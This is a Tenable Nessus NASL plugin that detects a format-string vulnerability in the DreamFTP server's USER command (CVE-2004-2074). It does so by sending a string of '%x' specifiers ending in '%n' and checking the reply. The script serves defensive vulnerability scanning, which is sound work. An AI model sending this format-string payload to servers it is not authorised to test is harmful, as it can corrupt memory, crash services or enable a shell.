# 
# (C) Tenable Network Security
#

if(description)
{
 script_id(12086);
 script_cve_id("CVE-2004-2074");
 script_bugtraq_id(9800);
 script_version ("$Revision: 1.3 $");
 
 desc["english"] = "
The remote DreamFTP server is vulnerable to a format string attack
when processing the USER command.

An attacker may exploit this flaw to gain a shell on this host.

Solution : Upgrade to DreamFTP 1.03 or newer (when available) or use 
another FTP server.

Risk factor: High";

 name["english"] = "DreamFTP format string";
 
 script_name(english:name["english"]);
 script_description(english:desc["english"]);
 
 summary["english"] = "Logs as a %n";
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
 family["english"] = "FTP";
 family["francais"] = "FTP";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "ftp_anonymous.nasl");
 script_require_keys("ftp/login");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if (! port) port = 21;
if (! get_port_state(port)) exit(0);
soc = open_sock_tcp(port);
if (! soc) exit(0);

r = ftp_recv_line(socket:soc);
if ( ! r ) exit(0);

# Recognize DreamFTP thanks to its error message
send(socket:soc, data:'USER ' + rand()  + '\r\n');
r = ftp_recv_line(socket:soc);
if ( ! r ) exit(0);
send(socket:soc, data:'PASS ' + rand() + '\r\n');
r = ftp_recv_line(socket:soc);
if ( ! r ) exit(0);

if ( "530 Not logged in, user or password incorrect!" >< r )
{
 # Overwrite the username buffer
 send(socket:soc, data:'USER ' + crap(data:"%x", length:86) + '%n\r\n');
 r = ftp_recv_line(socket:soc);
 if ( ! r ) exit(0);
 if (egrep(pattern:"^331 Password required for ..$", string:r) ) security_hole(port);
}
